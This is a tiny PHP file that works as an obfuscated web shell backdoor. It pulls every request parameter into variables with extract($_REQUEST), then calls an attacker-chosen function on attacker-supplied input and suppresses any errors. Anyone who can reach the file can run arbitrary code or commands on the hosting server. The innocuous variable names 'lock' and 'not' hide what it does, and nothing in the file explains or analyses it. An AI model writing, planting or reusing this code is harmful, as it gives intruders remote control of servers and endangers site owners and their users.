<?php
extract($_REQUEST) && @$lock(stripslashes($not)) && exit;